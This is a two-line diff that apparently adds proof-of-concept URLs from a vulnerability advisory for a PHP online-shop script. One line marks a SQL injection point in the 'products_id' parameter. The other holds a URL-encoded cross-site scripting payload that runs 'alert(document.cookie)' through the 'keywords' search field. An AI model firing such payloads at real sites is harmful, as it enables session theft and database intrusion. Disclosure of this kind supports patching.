@@ -1,0 +1,2 @@
+http://www.example.com/allpc25free/product_info.php?products_id=[SQL Injection] 
+http://www.example.com/advanced_search_result.php?keywords=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
